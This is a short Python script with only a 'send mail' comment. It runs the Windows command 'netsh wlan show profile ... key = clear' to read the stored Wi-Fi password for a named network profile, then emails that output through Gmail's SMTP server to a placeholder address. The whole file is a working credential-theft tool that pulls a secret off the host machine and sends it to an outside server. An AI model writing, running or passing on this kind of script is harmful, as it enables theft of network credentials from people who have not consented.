# send mail
import subprocess,smtplib

def sendmail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

command = "netsh wlan show profile iyappan key = clear"    
output = subprocess.check_output(command,shell=True)

sendmail("your email address","your passsword",output)
